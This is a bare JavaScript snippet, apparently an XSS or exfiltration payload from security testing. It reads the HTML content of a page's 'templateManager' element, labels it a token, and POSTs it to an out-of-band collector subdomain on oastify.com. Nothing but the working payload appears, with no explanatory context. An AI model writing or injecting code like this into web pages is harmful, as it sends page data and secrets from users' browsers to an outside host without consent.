var text = document.getElementsByClassName('templateManager')[0].innerHTML;

const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: JSON.stringify({ token: text })
};
fetch('https://7ltl8v7rv60bj5sruskg3bl3augl4pse.oastify.com/test2', requestOptions)
    .then(response => response.json())
